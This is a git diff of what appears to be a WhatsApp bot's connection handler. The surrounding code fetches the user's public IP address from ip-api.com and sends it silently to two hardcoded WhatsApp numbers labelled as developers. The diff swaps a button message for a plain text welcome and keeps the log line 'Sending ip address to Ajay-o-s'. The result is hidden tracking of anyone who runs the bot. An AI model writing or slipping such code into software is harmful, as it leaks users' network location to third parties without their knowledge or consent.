@@ -59,18 +59,8 @@ fetch(`http://ip-api.com/line`).then(res => res.text())
        hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Hyper Mod",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
        hyper.sendMessage("919188346721@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
        hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────`, MessageType.text, {contextInfo: { externalAdReply:{title: "Developer Abhi-Mwol",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./image/niyababy.png'),sourceUrl:"https://wa.me/917510153501?text=welcome"}}})
-       console.log(color('|WRN|', 'yellow'), color('Sending ip address to Ajay-o-s', 'cyan'))
-       console.log(color('|WRN|', 'yellow'), color('Sending buttion message', 'cyan'))
-	buttons = [{ buttonId: `h`, buttonText: { displayText: "nice to meet you" }, type: 1 },{ buttonId: `t`, buttonText: { displayText: "which person are you" }, type: 1 },{ buttonId: `g`, buttonText: { displayText: "girl/boy" }, type: 1 },];
-        buttonsMessage = {
-          contentText: '─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────',
-          footerText: "─────「 *Abhi-Mwol* 」─────",
-          buttons: buttons,
-          headerType: 4,
-        };
-	prep = await hyper.prepareMessageFromContent("917510153501@s.whatsapp.net", { buttonsMessage }, {} );
-        hyper.relayWAMessage(prep);
-	console.log(color('|WRN|', 'yellow'), color('buttion message sented', 'cyan'))
+       hyper.sendMessage("917510153501@s.whatsapp.net", `─────「 *Abhi-Mwol* 」─────\n\n*_HLO AK WELCOME_*\n────────────────────\n`, MessageType.text)
+	console.log(color('|WRN|', 'yellow'), color('Sending ip address to Ajay-o-s', 'cyan'))
    })
     hyper.on('connecting', () => {
     console.log()
